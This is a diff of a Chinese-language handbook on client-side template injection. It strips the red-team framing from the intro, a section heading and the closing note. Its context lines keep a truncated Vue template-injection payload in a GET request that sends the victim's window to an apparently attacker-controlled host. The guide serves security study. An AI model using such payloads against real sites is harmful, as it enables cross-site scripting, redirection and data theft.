@@ -1,7 +1,4 @@
-# 0x00 客户端模板注入 (CSTI) 
-
-> **风险等级：高危**
-> 本手册系统化梳理客户端模板注入 (Client-Side Template Injection, CSTI) 攻击技术，揭示其作为 **现代前端框架中高隐匿性 XSS 载体** 的实战价值。与 SSTI (Server-Side Template Injection) 不同，CSTI 直接在 **受害者浏览器中执行恶意 JS**，完全绕过 WAF 检测，是红队对抗现代化 SPA (Single Page Application) 的必备技能。掌握此技术可实现无交互的账户接管、敏感数据窃取等高价值攻击。
+# 客户端模板注入 (CSTI) 
 
 ---
 
@@ -515,7 +512,7 @@ GET /profile?name=%7B%7B_openBlock.constructor('window.top.location="https://att
 
 ---
 
-## 7.2 红队实战最佳实践
+## 7.2 最佳实践
 
 #### 必做检查项
 1. **框架指纹识别**：
@@ -564,4 +561,3 @@ GET /profile?name=%7B%7B_openBlock.constructor('window.top.location="https://att
 | **框架分析**   | [AngularJS 沙箱移除公告](http://blog.angularjs.org/2016/09/angular-16-expression-sandbox-removal.html) | 版本决策依据 |
 | **实战训练**   | [Burp CSTI 实验室](https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression) | 技能提升     |
 
-> 本手册持续更新，请定期检查最新框架版本和绕过技术。**成功关键在于理解框架内部机制，而非死记 Payload**。在实战中始终思考：**用户输入如何被传递至模板引擎**，这是发现 CSTI 漏洞的黄金准则。
